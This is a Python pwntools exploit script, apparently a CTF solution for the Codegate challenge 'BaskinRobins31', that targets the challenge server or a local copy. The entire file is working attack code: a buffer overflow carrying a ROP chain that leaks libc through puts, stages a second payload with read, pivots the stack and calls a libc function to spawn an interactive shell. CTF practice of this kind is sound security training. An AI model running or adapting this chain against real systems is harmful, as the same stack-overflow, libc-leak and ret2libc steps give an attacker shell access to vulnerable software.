#!/usr/bin/env python
from pwn import *

context(os='linux', arch='amd64')
# context.log_level = 'debug' # output verbose log

RHOST = "ch41l3ng3s.codegate.kr"
RPORT = 3131
LHOST = "127.0.0.1"
LPORT = 3131

# libc = ELF('')
elf = ELF('./BaskinRobins31')

def section_addr(name, elf=elf):
    return elf.get_section_by_name(name).header['sh_addr']

conn = None
if len(sys.argv) > 1:
    if sys.argv[1] == 'r':
        conn = remote(RHOST, RPORT)
    elif sys.argv[1] == 'l':
        conn = remote(LHOST, LPORT)
    elif sys.argv[1] == 'd':
        execute = """
        b *0x0000000000400979
        c
        """.format(hex(elf.symbols['main'] if 'main' in elf.symbols.keys() else elf.entrypoint))
        conn = gdb.debug(['./BaskinRobins31'], gdbscript=execute)
else:
    conn = process(['./BaskinRobins31'])
    # conn = process(['./BaskinRobins31'], env={'LD_PRELOAD': ''})

# preparing for exploitation

def my_turn(payload):
    conn.recvuntil('How many numbers do you want to take ? (1-3)')
    conn.send(payload)
    time.sleep(0.1)
    conn.recvuntil('remaining number(s)')
    conn.recvuntil('remaining number(s)')


# 0x0040087a: pop rdi ; pop rsi ; pop rdx ; ret  ;  (1 found)
pop_rbp = 0x004007e0
leave_ret = 0x00400979
pop_rdi_rsi_rdx = 0x0040087a
write_plt = 0x4006D0
read_plt = 0x0400700
puts_plt = 0x4006C0
log.info('Pwning')

payload = '1' + '\x00'*7 + 'a'* 0xb0
rop = p64(pop_rdi_rsi_rdx)
rop += p64(0x602018) * 3
rop += p64(puts_plt)
rop += p64(pop_rdi_rsi_rdx)
rop += p64(0)
rop += p64(0x602d00)
rop += p64(0x100)
rop += p64(read_plt)
rop += p64(pop_rbp)
rop += p64(0x602d00-0x8)
rop += p64(leave_ret)
payload += rop

for i in range(7):
    my_turn('1')
conn.send(payload)
print repr(conn.recvline())
print repr(conn.recvline())
print repr(conn.recvline())
libc_base = u64(conn.recv(6) + '\x00\x00') - 0x71290
log.info('libc_base = 0x%x', libc_base)

rop = p64(pop_rdi_rsi_rdx)
rop += p64(libc_base + 0x18cd57) * 3
rop += p64(libc_base + 0x45390)
conn.sendline(rop)
conn.interactive()